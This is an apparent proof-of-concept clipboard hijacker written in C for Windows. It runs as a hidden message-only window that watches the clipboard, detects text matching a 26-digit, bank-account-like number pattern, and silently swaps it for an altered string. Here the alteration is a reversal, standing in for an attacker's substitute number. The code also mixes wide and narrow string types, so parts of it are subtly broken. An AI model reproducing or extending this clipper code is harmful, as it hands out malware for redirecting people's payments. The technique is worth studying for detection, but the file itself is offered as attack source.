#include <stdio.h>
#include <Windows.h>

char *reverseText(const char *str)
{
    int start = 0;
    int end = strlen(str) - 1;
    char *reversed = (char *)malloc(strlen(str) + 1); // Allocate memory for reversed string
    if (reversed == NULL)
    {
        printf("Memory allocation failed.\n");
        exit(1);
    }

    strcpy(reversed, str); // Copy original string to reversed string

    while (start < end)
    {
        // Swap characters at start and end in the reversed string
        char temp = reversed[start];
        reversed[start] = reversed[end];
        reversed[end] = temp;

        // Move start and end pointers towards each other
        start++;
        end--;
    }

    return reversed;
}

int checkTextFormat(const char *text)
{
    int textLen = 32;
    int spacesIdx[6] = {2, 7, 12, 17, 22, 27};
    int digitsIdx[26] = {0, 1, 3, 4, 5, 6, 8, 9, 10, 11, 13, 14, 15, 16, 18, 19, 20, 21, 23, 24, 25, 26, 28, 29, 30, 31};

    int len = strlen(text);
    if (len < textLen)
    {
        return 0;
    }

    for (int i = 0; i < 26; i++)
    {
        if (!isdigit(text[digitsIdx[i]]))
        {
            return 0;
        }
    }

    for (int i = 0; i < 6; i++)
    {
        if ((text[spacesIdx[i]] != ' '))
        {
            return 0;
        }
    }

    return 1;
}

static HWND hwndNextViewer;
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_CREATE:
        hwndNextViewer = SetClipboardViewer(hwnd);
        break;

    case WM_DRAWCLIPBOARD:
        Sleep(100);
        OpenClipboard(hwnd);
        HANDLE hCbMem = GetClipboardData(CF_TEXT);

        if (hCbMem != NULL)
        {
            HANDLE hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));
            LPWSTR lpCbMem = GlobalLock(hCbMem);
            LPWSTR lpProgMem = GlobalLock(hProgMem);
            lstrcpy(lpProgMem, lpCbMem);
            printf("%s \n", lpProgMem);
            GlobalUnlock(hCbMem);
            GlobalUnlock(hProgMem);
            if (checkTextFormat(lpProgMem))
            {
                char *pStr = reverseText((const char *)lpProgMem);
                size_t wLen = strlen(pStr);
                HANDLE hGlMem = GlobalAlloc(GHND, (DWORD)wLen + 1);
                LPWSTR lpGlMem = GlobalLock(hGlMem);
                memcpy(lpGlMem, pStr, wLen + 1);
                GlobalUnlock(hGlMem);
                EmptyClipboard();
                SetClipboardData(CF_TEXT, hGlMem);
            }
        }

        CloseClipboard();
        break;

    case WM_CHANGECBCHAIN:
        if ((HWND)wParam == hwndNextViewer)
        {
            hwndNextViewer = (HWND)lParam;
        }
        else if (hwndNextViewer != NULL)
        {
            SendMessage(hwndNextViewer, message, wParam, lParam);
        }
        break;

    case WM_DESTROY:
        ChangeClipboardChain(hwnd, hwndNextViewer);
        PostQuitMessage(0);
        return 0;

    default:
        return DefWindowProc(hwnd, message, wParam, lParam);
    }
    return 0;
}

int main()
{
    WNDCLASS wc = {0};
    wc.lpfnWndProc = WndProc;
    wc.hInstance = GetModuleHandle(NULL);
    wc.lpszClassName = L"MyWindowClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, L"MyWindowClass", L"My Window", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);

    if (hwnd == NULL)
    {
        printf("Failed to create window\n");
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}